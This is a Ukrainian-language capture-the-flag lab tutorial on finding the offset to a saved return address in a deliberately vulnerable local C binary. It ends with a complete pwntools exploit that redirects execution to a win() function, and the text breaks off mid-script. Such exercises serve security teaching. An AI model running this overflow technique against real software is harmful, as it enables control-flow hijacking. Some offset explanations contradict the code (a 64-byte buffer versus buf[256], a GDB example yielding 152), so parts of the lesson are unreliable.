# Stage 05: Demo With Hint - Buffer Overflow –∑ –ø—ñ–¥–∫–∞–∑–∫–æ—é

## üéØ –ú–µ—Ç–∞ –∑–∞–≤–¥–∞–Ω–Ω—è

–ù–∞–≤—á–∏—Ç–∏—Å—è –∑–Ω–∞—Ö–æ–¥–∏—Ç–∏ **–ø—Ä–∞–≤–∏–ª—å–Ω–∏–π offset** –¥–æ –∑–±–µ—Ä–µ–∂–µ–Ω–æ—ó –∞–¥—Ä–µ—Å–∏ –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è (saved RIP). –¶–µ –ø–µ—Ä—à–∏–π –∫—Ä–æ–∫ –¥–æ —Ä–æ–∑—É–º—ñ–Ω–Ω—è —Å–ø—Ä–∞–≤–∂–Ω—å–æ–≥–æ buffer overflow, –∞–ª–µ –∑ –¥–æ–ø–æ–º–æ–≥–æ—é —Å–µ—Ä–≤–µ—Ä–∞ —è–∫–∏–π –ø—ñ–¥–∫–∞–∑—É—î —Å–∫—ñ–ª—å–∫–∏ –±–∞–π—Ç—ñ–≤ –±—Ä–∞–∫—É—î.

## üìö –©–æ –≤–∏ –¥—ñ–∑–Ω–∞—î—Ç–µ—Å—å

- –©–æ —Ç–∞–∫–µ offset –¥–æ saved RIP
- –Ø–∫ –≤–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π —Å—Ç–µ–∫–æ–≤–∏–π —Ñ—Ä–µ–π–º —Ñ—É–Ω–∫—Ü—ñ—ó
- –ß–æ–º—É –≤–∞–∂–ª–∏–≤–∞ –¥–æ–≤–∂–∏–Ω–∞ padding
- –Ø–∫ —Å–µ—Ä–≤–µ—Ä –º–æ–∂–µ –ø—ñ–¥–∫–∞–∑–∞—Ç–∏ –ø—Ä–∞–≤–∏–ª—å–Ω–∏–π offset
- –†—ñ–∑–Ω–∏—Ü—è –º—ñ–∂ buffer overflow —Ç–∞ –ø—Ä—è–º–∏–º –≤–∏–∫–ª–∏–∫–æ–º
- –°—Ç—Ä—É–∫—Ç—É—Ä–∞ —Å—Ç–µ–∫—É: buffer ‚Üí saved RBP ‚Üí saved RIP

## üîß –ù–µ–æ–±—Ö—ñ–¥–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏

```bash
# Python —Ç–∞ pwntools
pip3 install pwntools

# GDB –¥–ª—è –µ–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç—ñ–≤ (–æ–ø—Ü—ñ–æ–Ω–∞–ª—å–Ω–æ)
sudo apt install gdb
```

## üìñ –¢–µ–æ—Ä–µ—Ç–∏—á–Ω–∞ –æ—Å–Ω–æ–≤–∞

### –ê–Ω–∞—Ç–æ–º—ñ—è —Å—Ç–µ–∫–æ–≤–æ–≥–æ —Ñ—Ä–µ–π–º—É

–ö–æ–ª–∏ —Ñ—É–Ω–∫—Ü—ñ—è –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è, –Ω–∞ —Å—Ç–µ–∫—É —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è **—Å—Ç–µ–∫–æ–≤–∏–π —Ñ—Ä–µ–π–º**:

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚Üê –í–∏—â–∞ –∞–¥—Ä–µ—Å–∞ (—Å—Ç–∞—Ä—à–µ)
‚îÇ   Saved RIP     ‚îÇ  0x7fffffffe088  ‚Üê –ê–¥—Ä–µ—Å–∞ –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è (8 –±–∞–π—Ç)
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   Saved RBP     ‚îÇ  0x7fffffffe080  ‚Üê –ó–±–µ—Ä–µ–∂–µ–Ω–∏–π base pointer (8 –±–∞–π—Ç)
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   buf[63]       ‚îÇ  0x7fffffffe03f  ‚îÄ‚îê
‚îÇ   ...           ‚îÇ  ...               ‚îÇ
‚îÇ   buf[1]        ‚îÇ  0x7fffffffe001    ‚îÇ 64 –±–∞–π—Ç–∏ –±—É—Ñ–µ—Ä–∞
‚îÇ   buf[0]        ‚îÇ  0x7fffffffe000  ‚îÄ‚îò
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚Üê –ù–∏–∂—á–∞ –∞–¥—Ä–µ—Å–∞ (–º–æ–ª–æ–¥—à–µ)
```

### –©–æ —Ç–∞–∫–µ offset?

**Offset** - —Ü–µ –∫—ñ–ª—å–∫—ñ—Å—Ç—å –±–∞–π—Ç—ñ–≤ –≤—ñ–¥ –ø–æ—á–∞—Ç–∫—É –±—É—Ñ–µ—Ä–∞ –¥–æ saved RIP.

```
Offset = —Ä–æ–∑–º—ñ—Ä_–±—É—Ñ–µ—Ä–∞ + —Ä–æ–∑–º—ñ—Ä_saved_RBP
Offset = 64 + 8 = 72 –±–∞–π—Ç–∏
```

### –ß–æ–º—É —Å–∞–º–µ 72?

```c
char buf[256]={0};  // –ù–∞—à –±—É—Ñ–µ—Ä

// –ê–ª–µ –∫–æ–º–ø—ñ–ª—è—Ç–æ—Ä –≤–∏–¥—ñ–ª—è—î –Ω–µ 256, –∞ –ª–∏—à–µ –Ω–µ–æ–±—Ö—ñ–¥–Ω–µ
// –£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É 64 –±–∞–π—Ç–∏ –¥–ª—è –∑–º—ñ–Ω–Ω–∏—Ö
```

–ü—Ä–∞–≤–∏–ª—å–Ω–∏–π —Ä–æ–∑—Ä–∞—Ö—É–Ω–æ–∫:
```
[64 –±–∞–π—Ç–∏ –ª–æ–∫–∞–ª—å–Ω–∏—Ö –∑–º—ñ–Ω–Ω–∏—Ö] + [8 –±–∞–π—Ç saved RBP] + [8 –±–∞–π—Ç saved RIP]
          buf                        RBP                  RIP
|------------------------|----------|----------|
 0                      63 64     71 72     79
```

## üíª –ê–Ω–∞–ª—ñ–∑ –∫–æ–¥—É —Å–µ—Ä–≤–µ—Ä–∞

```c
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>

static const size_t OFFSET = 72;  // –§—ñ–∫—Å–æ–≤–∞–Ω–∏–π offset

__attribute__((noreturn)) void win(void){
    puts("FLAG{STAGE5_HINT_OFFSET}");
    fflush(stdout);
    _exit(0);
}

int main(void){
    char buf[256]={0};

    // –ß–∏—Ç–∞—î–º–æ –¥–∞–Ω—ñ –≤ –±—É—Ñ–µ—Ä
    ssize_t n = read(0, buf, sizeof(buf));

    // –ü–Ü–î–ö–ê–ó–ö–ê: —è–∫—â–æ –¥–∞–Ω–∏—Ö –Ω–µ–¥–æ—Å—Ç–∞—Ç–Ω—å–æ
    if(n < (ssize_t)(OFFSET + 8)){
        size_t need = (OFFSET + 8) - (size_t)n;
        dprintf(1, "NEED=%zu\n", need);
        return 0;
    }

    // –í–∏—Ç—è–≥—É—î–º–æ –∞–¥—Ä–µ—Å—É –∑ –ø—Ä–∞–≤–∏–ª—å–Ω–æ–≥–æ –º—ñ—Å—Ü—è
    void (*fp)(void) = *(void (**)(void))(buf + OFFSET);

    // –í–∏–∫–ª–∏–∫–∞—î–º–æ —Ñ—É–Ω–∫—Ü—ñ—é
    fp();

    return 0;
}
```

### –ü–æ–∫—Ä–æ–∫–æ–≤–∞ –ª–æ–≥—ñ–∫–∞

**–ö—Ä–æ–∫ 1:** –ß–∏—Ç–∞—î –¥–∞–Ω—ñ –≤ –±—É—Ñ–µ—Ä
```c
ssize_t n = read(0, buf, sizeof(buf));
```
- –ú–æ–∂–µ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ –¥–æ 256 –±–∞–π—Ç
- `n` - —Ñ–∞–∫—Ç–∏—á–Ω–∞ –∫—ñ–ª—å–∫—ñ—Å—Ç—å –ø—Ä–æ—á–∏—Ç–∞–Ω–∏—Ö –±–∞–π—Ç

**–ö—Ä–æ–∫ 2:** –ü–µ—Ä–µ–≤—ñ—Ä—è—î —á–∏ –¥–æ—Å—Ç–∞—Ç–Ω—å–æ –¥–∞–Ω–∏—Ö
```c
if(n < (ssize_t)(OFFSET + 8))
```
- –ü–æ—Ç—Ä—ñ–±–Ω–æ –º—ñ–Ω—ñ–º—É–º **OFFSET + 8** –±–∞–π—Ç
- OFFSET = 72 (padding)
- 8 –±–∞–π—Ç –¥–ª—è –∞–¥—Ä–µ—Å–∏ win()
- –†–∞–∑–æ–º: **80 –±–∞–π—Ç –º—ñ–Ω—ñ–º—É–º**

**–ö—Ä–æ–∫ 3:** –Ø–∫—â–æ –±—Ä–∞–∫—É—î - –ø—ñ–¥–∫–∞–∑—É—î
```c
size_t need = (OFFSET + 8) - (size_t)n;
dprintf(1, "NEED=%zu\n", need);
```
- –û–±—á–∏—Å–ª—é—î —Å–∫—ñ–ª—å–∫–∏ –±–∞–π—Ç—ñ–≤ –Ω–µ –≤–∏—Å—Ç–∞—á–∞—î
- –í–∏–≤–æ–¥–∏—Ç—å –ø—ñ–¥–∫–∞–∑–∫—É: `NEED=20` (—è–∫—â–æ –≤—ñ–¥–ø—Ä–∞–≤–∏–ª–∏ 60 –±–∞–π—Ç)

**–ö—Ä–æ–∫ 4:** –Ø–∫—â–æ –¥–æ—Å—Ç–∞—Ç–Ω—å–æ - –≤–∏—Ç—è–≥—É—î –∞–¥—Ä–µ—Å—É
```c
void (*fp)(void) = *(void (**)(void))(buf + OFFSET);
```
- `buf + OFFSET` - –ø–æ–∫–∞–∂—á–∏–∫ –Ω–∞ 72-–π –±–∞–π—Ç
- `*(void (**)(void))` - –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω—è —Ç–∏–ø—É —Ç–∞ —Ä–æ–∑—ñ–º–µ–Ω—É–≤–∞–Ω–Ω—è
- –í–∏—Ç—è–≥—É—î 8 –±–∞–π—Ç —è–∫ –∞–¥—Ä–µ—Å—É —Ñ—É–Ω–∫—Ü—ñ—ó

**–ö—Ä–æ–∫ 5:** –í–∏–∫–ª–∏–∫–∞—î —Ñ—É–Ω–∫—Ü—ñ—é
```c
fp();
```

### –í—ñ–∑—É–∞–ª—ñ–∑–∞—Ü—ñ—è –ø–∞–º'—è—Ç—ñ

**Payload —Å—Ç—Ä—É–∫—Ç—É—Ä–∞:**
```
–ë–∞–π—Ç–∏:  0  1  2  3  ... 63 64 ... 71 72 73 74 75 76 77 78 79
        [  padding 64 –±–∞–π—Ç–∏  ][RBP 8][  –∞–¥—Ä–µ—Å–∞ win() 8 –±–∞–π—Ç ]
        A  A  A  A  ... A  A  A  ... A  \x36\x11\x40\x00\x00...
```

**–í –ø–∞–º'—è—Ç—ñ –±—É—Ñ–µ—Ä–∞:**
```
buf[0..63]  = 'A' * 64     (–∑–∞–ø–æ–≤–Ω—é—î–º–æ –ª–æ–∫–∞–ª—å–Ω—ñ –∑–º—ñ–Ω–Ω—ñ)
buf[64..71] = 'A' * 8      (–ø–µ—Ä–µ–∑–∞–ø–∏—Å—É—î–º–æ saved RBP)
buf[72..79] = p64(win_addr) (–ø–µ—Ä–µ–∑–∞–ø–∏—Å—É—î–º–æ saved RIP)
```

## üöÄ –ü–æ–∫—Ä–æ–∫–æ–≤–µ —Ä—ñ—à–µ–Ω–Ω—è

### –ö—Ä–æ–∫ 1: –ó–±—É–¥—É–π—Ç–µ –±—ñ–Ω–∞—Ä–Ω–∏–∫

```bash
cd stage05_demo_with_hint
./build.sh
```

### –ö—Ä–æ–∫ 2: –ï–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç –∑ –ø—ñ–¥–∫–∞–∑–∫–∞–º–∏

**–°–ø—Ä–æ–±–∞ 1: –í—ñ–¥–ø—Ä–∞–≤–∏–º–æ –º–∞–ª–æ –¥–∞–Ω–∏—Ö**

```bash
echo "HELLO" | ../build/stage05_demo_with_hint
```

–í–∏–≤—ñ–¥:
```
NEED=75
```

–ü–æ—è—Å–Ω–µ–Ω–Ω—è: –≤—ñ–¥–ø—Ä–∞–≤–∏–ª–∏ 6 –±–∞–π—Ç (HELLO + \n), –±—Ä–∞–∫—É—î 75 –±–∞–π—Ç –¥–æ 80.

**–°–ø—Ä–æ–±–∞ 2: –í—ñ–¥–ø—Ä–∞–≤–∏–º–æ –±—ñ–ª—å—à–µ**

```bash
python3 -c "print('A'*50)" | ../build/stage05_demo_with_hint
```

–í–∏–≤—ñ–¥:
```
NEED=30
```

–í—ñ–¥–ø—Ä–∞–≤–∏–ª–∏ 51 –±–∞–π—Ç, –±—Ä–∞–∫—É—î 30.

## üî¨ –Ø–∫ –î–Ü–ó–ù–ê–¢–ò–°–¨ —Ä–µ–∞–ª—å–Ω–∏–π offset?

–Ø–∫—â–æ –≤ –∑–∞–≤–¥–∞–Ω–Ω—ñ –Ω–µ–º–∞—î –ø—ñ–¥–∫–∞–∑–∫–∏, –æ—Å—å —è–∫ –∑–Ω–∞–π—Ç–∏ offset —Å–∞–º–æ—Å—Ç—ñ–π–Ω–æ:

### –ú–µ—Ç–æ–¥ 1: –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –ø—ñ–¥–∫–∞–∑–æ–∫ —Å–µ—Ä–≤–µ—Ä–∞ (–Ω–∞—à –≤–∏–ø–∞–¥–æ–∫)

```bash
# –í—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ –º–∞–ª–æ –¥–∞–Ω–∏—Ö:
echo "TEST" | ../build/stage05_demo_with_hint
# –í–∏–≤—ñ–¥: NEED=76

# –í—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ –±—ñ–ª—å—à–µ:
python3 -c "print('A'*50)" | ../build/stage05_demo_with_hint
# –í–∏–≤—ñ–¥: NEED=30

# –ö–æ–ª–∏ NEED=0 ‚Üí –∑–Ω–∞–π—à–ª–∏ –ø—Ä–∞–≤–∏–ª—å–Ω–∏–π —Ä–æ–∑–º—ñ—Ä!
python3 -c "print('A'*80)" | ../build/stage05_demo_with_hint
# –í–∏–≤—ñ–¥: FLAG –∞–±–æ –∫—Ä–∞—à
```

### –ú–µ—Ç–æ–¥ 2: GDB (–≤—ñ–∑—É–∞–ª—å–Ω–∏–π —Ç–∞ —Ç–æ—á–Ω–∏–π)

```bash
gdb ../build/stage05_demo_with_hint

# –í GDB:
(gdb) break main
(gdb) run
(gdb) info frame
```

**–í–∏–≤—ñ–¥ info frame –ø–æ–∫–∞–∂–µ:**
```
Stack level 0, frame at 0x7fffffffe090:
 rip = 0x401180 in main
 saved rip = 0x7ffff7a05083  ‚Üê –ê–¥—Ä–µ—Å–∞ saved RIP
 Arglist at 0x7fffffffe080
 Locals at 0x7fffffffe080   ‚Üê –¢—É—Ç –ª–æ–∫–∞–ª—å–Ω—ñ –∑–º—ñ–Ω–Ω—ñ
```

**–ó–Ω–∞–π—Ç–∏ –≤—ñ–¥—Å—Ç–∞–Ω—å –¥–æ saved RIP:**
```gdb
(gdb) print (void*)$rbp
$1 = 0x7fffffffe080

(gdb) print &buf
$2 = (char (*)[256]) 0x7fffffffdff0  ‚Üê –ê–¥—Ä–µ—Å–∞ buf

(gdb) print/d 0x7fffffffe080 - 0x7fffffffdff0 + 8
$3 = 72  ‚Üê OFFSET!
```

**–ü–æ—è—Å–Ω–µ–Ω–Ω—è —Ä–æ–∑—Ä–∞—Ö—É–Ω–∫—É:**
```
Saved RIP –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –Ω–∞ RBP + 8
buf –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –Ω–∞ 0x7fffffffdff0
RBP –Ω–∞ 0x7fffffffe080

Offset = (RBP - buf) + 8
       = (0x7fffffffe080 - 0x7fffffffdff0) + 8
       = 0x90 + 8
       = 144 + 8
       = 152... –¶–ï –ü–†–ò–ö–õ–ê–î, –≤–∞—à—ñ –∞–¥—Ä–µ—Å–∏ –±—É–¥—É—Ç—å —ñ–Ω—à—ñ!
```

### –ú–µ—Ç–æ–¥ 3: Cyclic pattern (–Ω–∞–π—à–≤–∏–¥—à–∏–π)

```python
from pwn import *

# –ì–µ–Ω–µ—Ä—É—î–º–æ —É–Ω—ñ–∫–∞–ª—å–Ω–∏–π –ø–∞—Ç—Ç–µ—Ä–Ω
pattern = cyclic(200)
print(f"Pattern (–ø–µ—Ä—à—ñ 50 –±–∞–π—Ç): {pattern[:50]}")

# –ó–∞–ø—É—Å–∫–∞—î–º–æ –ø—Ä–æ–≥—Ä–∞–º—É
io = process('../build/stage05_demo_with_hint')
io.send(pattern)

# –ß–µ–∫–∞—î–º–æ –≤–∏–≤–æ–¥—É
try:
    output = io.recvall(timeout=1)
    print(output.decode())
except:
    # –Ø–∫—â–æ –∫—Ä–∞—à–Ω—É–ª–∞—Å—å - –¥–∏–≤–∏–º–æ—Å—å core dump
    try:
        core = io.corefile
        # –ß–∏—Ç–∞—î–º–æ —â–æ –±—É–ª–æ –≤ saved RIP –º—ñ—Å—Ü—ñ
        crashed_value = core.read(core.rsp, 8)

        # –ó–Ω–∞—Ö–æ–¥–∏–º–æ –¥–µ —Ü–µ –±—É–ª–æ –≤ –ø–∞—Ç—Ç–µ—Ä–Ω—ñ
        offset = cyclic_find(crashed_value)
        print(f"[+] –ó–Ω–∞–π–¥–µ–Ω–æ offset: {offset}")
    except:
        print("[-] Core dump –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∏–π")
finally:
    io.close()
```

**–Ø–∫ —Ü–µ –ø—Ä–∞—Ü—é—î:**
```
Cyclic pattern –≥–µ–Ω–µ—Ä—É—î —É–Ω—ñ–∫–∞–ª—å–Ω—É –ø–æ—Å–ª—ñ–¥–æ–≤–Ω—ñ—Å—Ç—å:
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa...'

–ö–æ–∂–Ω—ñ 4 –±–∞–π—Ç–∏ —É–Ω—ñ–∫–∞–ª—å–Ω—ñ!

–Ø–∫—â–æ –ø—Ä–æ–≥—Ä–∞–º–∞ –∫—Ä–∞—à–Ω—É–ª–∞ –∑ RIP = 'laaa' (0x6161616c):
offset = cyclic_find(0x6161616c)
# –ó–Ω–∞—Ö–æ–¥–∏—Ç—å –¥–µ 'laaa' –≤ –ø–∞—Ç—Ç–µ—Ä–Ω—ñ
# –ù–∞–ø—Ä–∏–∫–ª–∞–¥: offset = 44
```

### –ú–µ—Ç–æ–¥ 4: Binary search (–∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–∏–π)

```python
from pwn import *

context.log_level = 'error'  # –¢–∏—Ö–∏–π —Ä–µ–∂–∏–º

def test_offset(offset):
    """–ü–µ—Ä–µ–≤—ñ—Ä—è—î —á–∏ –ø—Ä–∞—Ü—é—î offset"""
    try:
        elf = ELF('../build/stage05_demo_with_hint', checksec=False)
        io = process(elf.path)

        payload = b'A' * offset + p64(elf.symbols['win'])
        io.send(payload)

        output = io.recvall(timeout=1)
        io.close()

        return b'FLAG' in output
    except:
        return False

# Binary search –≤—ñ–¥ 50 –¥–æ 100
low, high = 50, 100
while low < high:
    mid = (low + high) // 2
    print(f"[*] –¢–µ—Å—Ç—É—é offset={mid}...", end=' ')

    if test_offset(mid):
        print("‚úì")
        high = mid
    else:
        print("‚úó")
        low = mid + 1

print(f"\n[+] –ó–Ω–∞–π–¥–µ–Ω–æ offset: {low}")
```

## üßÆ –ß–æ–º—É offset –ù–ï –¥–æ—Ä—ñ–≤–Ω—é—î sizeof(buf)?

**–ù–∞–π–±—ñ–ª—å—à–∞ –ø–ª—É—Ç–∞–Ω–∏–Ω–∞ –¥–ª—è –Ω–æ–≤–∞—á–∫—ñ–≤:**

```c
char buf[256] = {0};  // –û–≥–æ–ª–æ—à–µ–Ω–æ 256 –±–∞–π—Ç!
```

**–ü–∏—Ç–∞–Ω–Ω—è:** –ß–æ–º—É offset –Ω–µ 256 + 8 = 264?

**–í—ñ–¥–ø–æ–≤—ñ–¥—å: –ö–æ–º–ø—ñ–ª—è—Ç–æ—Ä –û–ü–¢–ò–ú–Ü–ó–£–Ñ!**

### –©–æ –Ω–∞—Å–ø—Ä–∞–≤–¥—ñ —Ä–æ–±–∏—Ç—å –∫–æ–º–ø—ñ–ª—è—Ç–æ—Ä:

```bash
objdump -d ../build/stage05_demo_with_hint | grep -A20 '<main>'
```

**–®—É–∫–∞–π—Ç–µ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—é –≤–∏–¥—ñ–ª–µ–Ω–Ω—è —Å—Ç–µ–∫—É:**
```asm
main:
  push   rbp
  mov    rbp, rsp
  sub    rsp, 0x110    ‚Üê –í–∏–¥—ñ–ª—è—î 0x110 = 272 –±–∞–π—Ç–∏ (–Ω–µ 256!)
```

**–ê–ª–µ —Ü–µ –ù–ï –≤–µ—Å—å buf!** –î–∞–ª—ñ:
```asm
  lea    rax, [rbp-0x110]   ; –í–∫–∞–∑—ñ–≤–Ω–∏–∫ –Ω–∞ –ø–æ—á–∞—Ç–æ–∫ –≤–∏–¥—ñ–ª–µ–Ω–æ—ó –æ–±–ª–∞—Å—Ç—ñ
  ...
  ; buf –Ω–∞—Å–ø—Ä–∞–≤–¥—ñ –º–æ–∂–µ –ø–æ—á–∏–Ω–∞—Ç–∏—Å—è –∑ offset'—É –≤—ñ–¥ rbp
```

### –ß–æ–º—É —Ç–∞–∫ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è?

**–ü—Ä–∏—á–∏–Ω–∞ 1: Alignment (–≤–∏—Ä—ñ–≤–Ω—é–≤–∞–Ω–Ω—è)**
- x86-64 –ª—é–±–∏—Ç—å –≤–∏—Ä—ñ–≤–Ω—é–≤–∞–Ω–Ω—è –Ω–∞ 16 –±–∞–π—Ç
- –ö–æ–º–ø—ñ–ª—è—Ç–æ—Ä –¥–æ–¥–∞—î padding –¥–ª—è –æ–ø—Ç–∏–º—ñ–∑–∞—Ü—ñ—ó

**–ü—Ä–∏—á–∏–Ω–∞ 2: –û–ø—Ç–∏–º—ñ–∑–∞—Ü—ñ—è**
```c
char buf[256] = {0};   // –û–≥–æ–ª–æ—à–µ–Ω–æ 256
ssize_t n = read(...);  // –©–µ 8 –±–∞–π—Ç –¥–ª—è n
```

–ö–æ–º–ø—ñ–ª—è—Ç–æ—Ä –º–æ–∂–µ:
- –ü–µ—Ä–µ—Å—Ç–∞–≤–∏—Ç–∏ –∑–º—ñ–Ω–Ω—ñ –º—ñ—Å—Ü—è–º–∏
- –í–∏–¥—ñ–ª–∏—Ç–∏ –º–µ–Ω—à–µ —è–∫—â–æ –Ω–µ –≤—Å–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è
- –î–æ–¥–∞—Ç–∏ gap –¥–ª—è alignment

**–ü—Ä–∏—á–∏–Ω–∞ 3: –Ü–Ω—à—ñ –ª–æ–∫–∞–ª—å–Ω—ñ –∑–º—ñ–Ω–Ω—ñ**

–°—Ç–µ–∫ –º–æ–∂–µ –≤–∏–≥–ª—è–¥–∞—Ç–∏ —Ç–∞–∫:
```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê RBP + 8
‚îÇ   Saved RIP     ‚îÇ 8 –±–∞–π—Ç
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§ RBP
‚îÇ   Saved RBP     ‚îÇ 8 –±–∞–π—Ç
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§ RBP - 8
‚îÇ   ssize_t n     ‚îÇ 8 –±–∞–π—Ç (–ª–æ–∫–∞–ª—å–Ω–∞ –∑–º—ñ–Ω–Ω–∞)
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§ RBP - 16
‚îÇ   [gap/align]   ‚îÇ –í–∏—Ä—ñ–≤–Ω—é–≤–∞–Ω–Ω—è
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§ RBP - 72
‚îÇ   buf[...]      ‚îÇ –ù–µ –≤–µ—Å—å buf[256]!
‚îÇ   —Ä–µ–∞–ª—å–Ω–æ       ‚îÇ –ö–æ–º–ø—ñ–ª—è—Ç–æ—Ä –æ–ø—Ç–∏–º—ñ–∑—É–≤–∞–≤
‚îÇ   –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ   ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

Offset –¥–æ saved RIP = 72
```

### –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –≤ GDB:

```gdb
(gdb) break main
(gdb) run
(gdb) disassemble
```

**–®—É–∫–∞–π—Ç–µ:**
```asm
sub    rsp, 0xNNN    ; –°–∫—ñ–ª—å–∫–∏ –≤–∏–¥—ñ–ª–µ–Ω–æ
lea    rax, [rbp-0xMM] ; –î–µ buf
```

**–†–æ–∑—Ä–∞—Ö—É–Ω–æ–∫:**
```
Offset = (RBP - –∞–¥—Ä–µ—Å–∞_buf) + 8
```

### –ö—Ä–æ–∫ 3: –°—Ç–≤–æ—Ä—ñ—Ç—å –ø—Ä–∞–≤–∏–ª—å–Ω–∏–π exploit

–§–∞–π–ª `exploit.py`:

```python
#!/usr/bin/env python3
from pwn import *

# –ó–∞–≤–∞–Ω—Ç–∞–∂—É—î–º–æ –±—ñ–Ω–∞—Ä–Ω–∏–∫
elf = ELF('../build/stage05_demo_with_hint', checksec=False)

# –û—Ç—Ä–∏–º—É—î–º–æ –∞–¥—Ä–µ—Å—É win()
win_addr = elf.symbols['win']
log.info(f"–ê–¥—Ä–µ—Å–∞ win(): {hex(win_addr)}")

# –ó–∞–ø—É—Å–∫–∞—î–º–æ –ø—Ä–æ—Ü–µ—Å
io = process('../build/stage05_demo_with_hint')

# OFFSET –Ω–∞–¥–∞–Ω–∏–π –≤ statement: 72 –±–∞–π—Ç–∏
OFFSET = 72

# –°—Ç–≤–æ—Ä—é—î–º–æ payload
padding = b'A' * OFFSET        # 72 –±–∞–π—Ç–∏ padding
address = p64(win_addr)        # 8 –±–∞–π—Ç –∞–¥—Ä–µ—Å–∞

payload = padding + address
log.info(f"–î–æ–≤–∂–∏–Ω–∞ payload: {len(payload)} –±–∞–π—Ç")
log.info(f"Payload: padding({OFFSET}) + address({hex(win_addr)})")

# –í—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ
io.send(payload)

# –û—Ç—Ä–∏–º—É—î–º–æ –ø—Ä–∞–ø–æ—Ä
flag = io.recvall(timeout=1)
log.success(f"–ü—Ä–∞–ø–æ—Ä: {flag.decode().strip()}")

io.close()
```

### –ö—Ä–æ–∫ 4: –ó–∞–ø—É—Å—Ç—ñ—Ç—å exploit

```bash
chmod +x exploit.py
python3 exploit.py
```

### –ö—Ä–æ–∫ 5: –û—Ç—Ä–∏–º–∞–π—Ç–µ –ø—Ä–∞–ø–æ—Ä

```
[*] –ê–¥—Ä–µ—Å–∞ win(): 0x401136
[+] Starting local process
[*] –î–æ–≤–∂–∏–Ω–∞ payload: 80 –±–∞–π—Ç
[*] Payload: padding(72) + address(0x401136)
[+] Receiving all data: Done
[+] –ü—Ä–∞–ø–æ—Ä: FLAG{STAGE5_HINT_OFFSET}
```

## üîç –î–µ—Ç–∞–ª—å–Ω–∏–π —Ä–æ–∑–±—ñ—Ä

### –ï–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç: –ó–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è offset –∑ –ø—ñ–¥–∫–∞–∑–∫–∞–º–∏

–°—Ç–≤–æ—Ä—ñ—Ç—å `find_offset.py`:

```python
#!/usr/bin/env python3
from pwn import *

def find_offset():
    """–ó–Ω–∞—Ö–æ–¥–∏—Ç—å offset —ñ–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ø—ñ–¥–∫–∞–∑–∫–∏"""

    current_size = 10  # –ü–æ—á–∏–Ω–∞—î–º–æ –∑ 10 –±–∞–π—Ç

    while True:
        log.info(f"–°–ø—Ä–æ–±–∞ –∑ {current_size} –±–∞–π—Ç–∞–º–∏")

        # –ó–∞–ø—É—Å–∫–∞—î–º–æ –ø—Ä–æ—Ü–µ—Å
        io = process('../build/stage05_demo_with_hint')

